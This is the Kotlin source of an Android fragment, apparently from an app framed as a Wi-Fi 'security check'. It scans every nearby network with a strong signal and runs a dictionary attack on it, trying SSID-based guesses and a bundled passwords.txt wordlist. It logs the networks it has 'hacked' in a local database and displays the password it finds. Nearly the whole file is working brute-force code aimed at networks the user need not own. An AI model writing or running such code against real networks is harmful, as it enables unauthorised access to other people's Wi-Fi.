package com.practice.securewifi.view

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import com.practice.securewifi.receiver.ConnectivityActionReceiver
import com.practice.securewifi.R
import com.practice.securewifi.dao.WifiSafetyDao
import com.practice.securewifi.util.WifiManagerProvider
import com.practice.securewifi.databinding.FragmentConnectBinding
import com.practice.securewifi.db.WifiSafetyDatabase
import com.practice.securewifi.domain.entity.WifiCheckResult
import com.practice.securewifi.domain.entity.WifiPasswordsCrossRef
import kotlinx.coroutines.*

class ConnectFragment : Fragment(), ConnectivityActionReceiver.OnSampleReadyListener {

    private val interval = 3000L

    private var foundPassword = false

    private lateinit var wifiManager: WifiManager

    private lateinit var wifiScanReceiver: BroadcastReceiver

    private lateinit var dao: WifiSafetyDao

    private var connection: Job = Job()

    private var _binding: FragmentConnectBinding? = null

    private val binding get() = _binding!!

    //val uiScope = CoroutineScope(Dispatchers.Main + connection)

    //@RequiresApi(Build.VERSION_CODES.O)
    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?
    ): View {
        _binding = FragmentConnectBinding.inflate(inflater, container, false)
        val broadcastReceiver = ConnectivityActionReceiver(this)
        val intentFilter = IntentFilter()
        intentFilter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION)
        requireActivity().registerReceiver(broadcastReceiver, intentFilter)

        wifiManager = WifiManagerProvider.getWifiManager(requireActivity())

        dao = WifiSafetyDatabase.getInstance(requireActivity().application).wifiSafetyDao

        connection.cancel()

        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        val buttonConnect: Button = binding.startSecurityCheckButton
        val progressBar: ProgressBar = binding.attemptingConnectsProgressbar
        val startSecurityCheckTextView = binding.securityCheckTextview
        buttonConnect.setOnClickListener {
            if (!connection.isActive) {

                //val intent = Intent(requireActivity(), ConnectionService::class.java)
                //requireActivity().startForegroundService(intent)

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    val panelIntent = Intent(Settings.Panel.ACTION_WIFI)
                    startActivityForResult(panelIntent, 0)
                } else {
                    wifiManager.isWifiEnabled = true
                }
                buttonConnect.text = getString(R.string.stop)
                progressBar.visibility = View.VISIBLE

                startConnecting()
            } else {
                connection.cancel()
                buttonConnect.text = getString(R.string.start)
                startSecurityCheckTextView.text = getString(R.string.check_password_security)
                progressBar.visibility = View.INVISIBLE
            }
        }
        super.onViewCreated(view, savedInstanceState)
    }

    private fun startConnecting() {
        wifiScanReceiver = object : BroadcastReceiver() {

            override fun onReceive(context: Context, intent: Intent) {
                val success = intent.getBooleanExtra(
                    WifiManager.EXTRA_RESULTS_UPDATED, false
                )
                if (success) {
                    scanSuccess()
                } else {
                    scanFailure()
                }
                requireActivity().unregisterReceiver(wifiScanReceiver)
            }
        }

        val intentFilter = IntentFilter()
        intentFilter.addAction(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
        requireActivity().registerReceiver(wifiScanReceiver, intentFilter)

        wifiManager.startScan()
    }

    private fun scanSuccess() {
        //Check if ACCESS_FINE_LOCATION permission is granted
        if (ContextCompat.checkSelfPermission(
                requireActivity().applicationContext, Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_DENIED
        ) {
            //Ask for the permission
            requestPermissions(
                arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), 1
            )
        }

        val nearbyWifiPoints = wifiManager.scanResults

        val wifiSSIDs = nearbyWifiPoints.filter {
            it.SSID != "" && WifiManager.calculateSignalLevel(
                it.level,
                10
            ) > 6
        }.sortedByDescending { it.level }.map { it.SSID }

        var correctPassword = ""
        var passwordCountNeeded = 0

        connection = GlobalScope.launch {
            if (ContextCompat.checkSelfPermission(
                    requireActivity().applicationContext, Manifest.permission.ACCESS_FINE_LOCATION
                ) == PackageManager.PERMISSION_GRANTED
            ) {
                val textView: TextView = binding.securityCheckTextview

                foundPassword = false
                for (networkSSID in wifiSSIDs) {
                    // If password was found during this search
                    if (foundPassword) break

                    val wifi = dao.getWifiCheckResult(networkSSID)
                    // If this network hasn't ever been a subject to hacking, save it
                    if (wifi == null) {
                        dao.insertWifiCheckResult(WifiCheckResult(networkSSID, null))
                    } else if (wifi.correctPassword != null) {
                        // If this particular network has already been hacked
                        continue
                    }
                    val triedPasswords = dao.getTriedPasswordsForWifi(networkSSID)

                    val conf = WifiConfiguration()
                    conf.SSID = "\"" + networkSSID + "\"" // String should contain ssid in quotes

                    val networkPasswords = getPasswordsList(networkSSID)
                    var passwordCount = 0


                    for (networkPass in networkPasswords) {
                        passwordCount++

                        // If this password has already been checked for this wifi skip it
                        if (triedPasswords.contains(networkPass)) continue

                        withContext(Dispatchers.Main) {
                            textView.text = getString(
                                R.string.attempting_to_connect,
                                networkSSID,
                                passwordCount, // count of passwords already tried
                                networkPasswords.size, // password count for wifi
                                60 / (interval / 1000) // passwords a minute
                            )
                        }

                        conf.preSharedKey = "\"" + networkPass + "\""
                        // only works for API < 29
                        val netId = wifiManager.addNetwork(conf)
                        if (netId != -1) {
                            wifiManager.disconnect()
                            wifiManager.enableNetwork(netId, true)
                        } else {
                            val list = wifiManager.configuredNetworks
                            for (network in list) {
                                if (network.SSID != null && network.SSID == "\"" + networkSSID + "\"") {
                                    wifiManager.disconnect()
                                    wifiManager.enableNetwork(network.networkId, true)
                                    wifiManager.reconnect()
                                    break
                                }
                            }
                        }
                        delay(interval)

                        dao.insertWifiPasswordsCrossRef(
                            WifiPasswordsCrossRef(
                                networkSSID,
                                networkPass
                            )
                        )

                        if (foundPassword) {
                            correctPassword = networkPass
                            passwordCountNeeded = passwordCount
                            dao.insertWifiCheckResult(
                                WifiCheckResult(
                                    networkSSID,
                                    correctPassword
                                )
                            )
                            break
                        }

                    }
                    if (foundPassword) {
                        withContext(Dispatchers.Main) {
                            // Show the correct password
                            textView.text = getString(
                                R.string.password_hacking_results,
                                networkSSID,
                                correctPassword,
                                passwordCountNeeded
                            )
                        }
                    }
                }
                if (!foundPassword) {
                    withContext(Dispatchers.Main) {
                        textView.text = getString(R.string.couldnt_find_password)
                    }
                }
            }
            connection.cancel()
            binding.startSecurityCheckButton.text = getString(R.string.start)
            binding.attemptingConnectsProgressbar.visibility = View.INVISIBLE
        }
    }

    private fun scanFailure() {
        binding.securityCheckTextview.text = getString(R.string.scan_failure)
        connection.cancel()
        binding.startSecurityCheckButton.text = getString(R.string.start)
        binding.attemptingConnectsProgressbar.visibility = View.INVISIBLE
    }

    private fun getPasswordsList(ssid: String): List<String> {
        val fixedPasswords = requireActivity().assets.open("passwords.txt").bufferedReader().use {
            it.readLines()
        }
        return listOf(ssid, /* "pokasuki69", */"${ssid}123") + fixedPasswords
    }

    override fun onSampleDataReady() {
        foundPassword = true
    }

    override fun onDestroyView() {
        super.onDestroyView()
        connection.cancel()
    }
}